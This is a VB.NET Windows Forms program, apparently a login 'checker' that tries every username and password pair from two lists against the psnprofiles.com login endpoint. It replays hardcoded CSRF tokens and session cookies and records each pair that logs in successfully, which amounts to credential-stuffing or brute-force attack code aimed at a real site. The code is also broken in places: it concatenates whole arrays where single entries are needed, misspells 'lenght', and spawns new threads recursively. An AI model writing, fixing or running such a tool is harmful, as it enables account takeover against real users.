Imports System.Net
Imports System.IO
Imports System.Text
Public Class Form1
    Dim off As Boolean = False
    Dim usernames
    Dim Passwords
    Function Checked()
        usernames = TextBox1.Lines
        Passwords = TextBox2.Lines
        For i As Integer = 0 To usernames.lenght - 1
            For ii As Integer = 0 To Passwords.lenght - 1
                Dim PostData As String = "user=" + usernames + "&Password=" + Passwords
                Dim REQ1 As HttpWebRequest = DirectCast(WebRequest.Create("https://psnprofiles.com/xhr/login"), HttpWebRequest)
                REQ1.Method = "POST"
                REQ1.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
                REQ1.Headers.Add("x-csrf-token", "Fr0Ixpgbsfmm7X30NyjgvoMWKEUFJ37oDyNDLwV9")
                REQ1.Headers.Add("x-psnprofiles-ajax", "1")
                REQ1.ContentType = "application/x-www-form-urlencoded; charset=UTF-8"
                REQ1.Headers.Add("x-requested-with", "XMLHttpRequest")
                REQ1.Headers.Add("cookie", "XSRF-TOKEN=eyJpdiI6Ijl1K1NveDdRaitOKzVXZXp4OFI0Vnc9PSIsInZhbHVlIjoiRGd3SGNUdXRndkxGWVZSeXREUHZZK3k3bzhlNVlCM3YzbDFXbnB1MEtsYzNpTDUxMmJsWCtOTTd0M2ExWk02YnFneXk0KzNWXC9PRFE5cFFkNFRFOVVBPT0iLCJtYWMiOiJhYzU0NGU5OWUzYTNjY2JmYTA2ODVlYTFjMTY2MzM5YmM2N2VmMzA3MzJjZWI2NmZiMWMzMmU3OGQ5NTY1ZDc2In0%3D; laravel_session=eyJpdiI6IkpLcnpDV0wwZlBFeVhCNjY1OTRaa3c9PSIsInZhbHVlIjoiMHZzdTZSVm5aV3RPV3pnemlUN3NiZ3lFT0c0MHZwU204YTN1SWhVc1o3VVpwOWkraHZlNlVqeCtXbjNXQVFsNGg5Y0hjS2k1alY3cUluU290Q3YwOUE9PSIsIm1hYyI6IjNkN2IwZTczNTY5NmUyYzg2ZGM2N2M3MTViMzU0NmIzYTU5YmM1MDllOTQ3ZWI2OGFmM2M4ZDliMjY1YTMxMmYifQ%3D%3D; _ga=GA1.2.1010018099.1516110595; _gid=GA1.2.770394835.1516110595; _gat=1")
                REQ1.Referer = "https://psnprofiles.com/"
                REQ1.KeepAlive = True
                Dim Bytes As Byte() = Encoding.UTF8.GetBytes(PostData)
                REQ1.ContentLength = Bytes.Length
                Dim REQ2 As Stream = REQ1.GetRequestStream
                REQ2.Write(Bytes, 0, Bytes.Length)
                REQ2.Close()
                Dim Response As HttpWebResponse
                Response = DirectCast(REQ1.GetResponse(), HttpWebResponse)
                Dim Reader As New StreamReader(Response.GetResponseStream)
                Dim Pn As String = Reader.ReadToEnd
                If Pn.Contains("""success"":""True""") Then
                    TextBox3.AppendText(usernames(i) & " : " & Passwords(ii))

                End If

            Next
        Next
        Dim F As New Threading.Thread(AddressOf Checked)
        F.Start()
    End Function

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        off = True
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim F As New Threading.Thread(AddressOf Checked)
        F.Start()
    End Sub
End Class
